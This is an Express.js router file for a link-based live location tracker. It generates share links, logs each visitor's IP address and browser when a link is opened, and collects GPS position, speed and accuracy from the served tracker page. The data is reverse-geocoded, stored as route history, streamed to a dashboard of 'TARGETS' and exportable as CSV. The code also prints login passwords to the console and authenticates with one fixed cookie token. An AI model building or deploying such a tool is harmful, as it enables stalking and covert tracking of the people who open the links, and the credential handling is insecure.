const express = require("express");
const path = require("path");
const LinkLog = require("./models/LinkLog");
const router = express.Router();
const config = require("./config");
const Location = require("./models/Location");
const axios = require("axios");

const TARGETS = {};
const USER_STATUS = {};

// =========================
// Check Online / Offline
// =========================
setInterval(() => {

    for (const id in TARGETS) {

        if (Date.now() - USER_STATUS[id] > 15000) {

            TARGETS[id].status = "Offline";

        } else {

            TARGETS[id].status = "Online";

        }

    }

}, 5000);


async function getAddress(lat, lng) {

    try {

        const response = await axios.get(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
            {
                headers: {
                    "User-Agent": "LiveLocationTracker"
                }
            }
        );

        return response.data.display_name;

    } catch (err) {

        console.log("Address Error:", err.message);

        return "Address Not Found";
    }

}

// =========================
// Login
// =========================
router.get("/login", (req, res) => {

    res.sendFile(path.join(__dirname, "views", "login.html"));

});

router.post("/login", (req, res) => {

    console.log(req.body);

    const { username, password } = req.body;

    console.log(username, password);
    console.log(config.username, config.password);

    if (
        username === config.username &&
        password === config.password
    ) {
        res.cookie("token", config.token);
        return res.redirect("/");
    }

    res.send("Invalid Login");
});


const crypto = require("crypto");

const LINKS = {};

router.get("/create-link", (req, res) => {

    const token = crypto.randomBytes(16).toString("hex");

    LINKS[token] = true;

    const baseURL =
        process.env.RENDER_EXTERNAL_URL ||
        `${req.protocol}://${req.get("host")}`;

    res.json({
        link: `${baseURL}/share/${token}`
    });

});


router.get("/share/:token", async (req, res) => {

    const token = req.params.token;

    try {

        await LinkLog.create({

            token: token,
            ip: req.ip,
            browser: req.headers["user-agent"],
            openedAt: new Date()

        });

        console.log("Link Opened and Saved");

        res.sendFile(path.join(__dirname, "views", "tracker.html"));

    } catch (err) {

        console.log(err);

        res.send(err.message);

    }

});


router.post("/permission", async (req, res) => {

    const { token, userId, permission } = req.body;

    await LinkLog.findOneAndUpdate(

        { token },

        {

            userId,

            locationPermission: permission

        }

    );

    res.send("Updated");

});

// =========================
// Authentication
// =========================
router.use((req, res, next) => {

    if (req.cookies.token === config.token) {

        next();

    } else {

        return res.redirect("/login");

    }

});

// =========================
// Home
// =========================
router.get("/", (req, res) => {

    res.sendFile(path.join(__dirname, "views", "home.html"));

});

// =========================
// Tracker Page
// =========================
router.get("/tracker", (req, res) => {

    res.sendFile(path.join(__dirname, "views", "tracker.html"));

});


   // =========================
// Receive GPS Data
// =========================
router.post("/tracker", async (req, res) => {

    try {

        const {
            id,
            name,
            lat,
            lng,
            speed,
            accuracy
        } = req.body;

        // Update last active time
        USER_STATUS[id] = Date.now();

        if (!TARGETS[id]) {

            TARGETS[id] = {

                history: []

            };

        }

        // Reverse Geocoding
        const address = await getAddress(lat, lng);

        // Update Live Target Data
        TARGETS[id].name = name;
        TARGETS[id].lat = lat;
        TARGETS[id].lng = lng;
        TARGETS[id].speed = speed;
        TARGETS[id].accuracy = accuracy;
        TARGETS[id].address = address;
        TARGETS[id].status = "Online";
        TARGETS[id].lastUpdated = new Date().toLocaleTimeString();

        // Save Route History
        TARGETS[id].history.push({
            name,
            lat,
            lng,
            address,
            time: new Date()
        });

        // Save in MongoDB
        await Location.create({

            userId: id,

            name: name,

            latitude: lat,

            longitude: lng,

            speed: speed,

            accuracy: accuracy,

            address: address,

            status: "Online",

            lastUpdated: new Date()

        });

        // Send Live Update to Dashboard & Map
        global.IO.emit("location-update", {

            id,

            name,

            lat,

            lng,

            speed,

            accuracy,

            address,

            status: "Online",

            lastUpdated: TARGETS[id].lastUpdated

        });

        res.send("Location Saved Successfully");

    }

    catch (err) {

        console.log(err);

        res.status(500).send("Database Error");

    }

})
// =========================
// Dashboard Data
// =========================
router.get("/targets", (req, res) => {

    res.json(TARGETS);

});

// =========================
// History
// =========================
router.get("/history/:id", async (req, res) => {

    const history = await Location.find({

        userId: req.params.id

    }).sort({

        createdAt: 1

    });

    res.json(history);

});

// =========================
// Map
// =========================
router.get("/map", (req, res) => {

    res.sendFile(path.join(__dirname, "views", "map.html"));

});

// =========================
// Delete History
// =========================
router.delete("/history/:id", async (req, res) => {

    await Location.deleteMany({

        userId: req.params.id

    });

    res.send("Deleted");

});

// =========================
// Export CSV
// =========================
router.get("/export/:id", async (req, res) => {

    const data = await Location.find({

        userId: req.params.id

    });

    const { Parser } = require("json2csv");

    const parser = new Parser();

    const csv = parser.parse(data);

    res.header("Content-Type", "text/csv");

    res.attachment("history.csv");

    res.send(csv);

});


router.get("/logs", async (req, res) => {

    try {

        const logs = await LinkLog.find().sort({
            openedAt: -1
        });

        res.json(logs);

    } catch (err) {

        console.log(err);

        res.status(500).send(err.message);

    }

});

module.exports = router;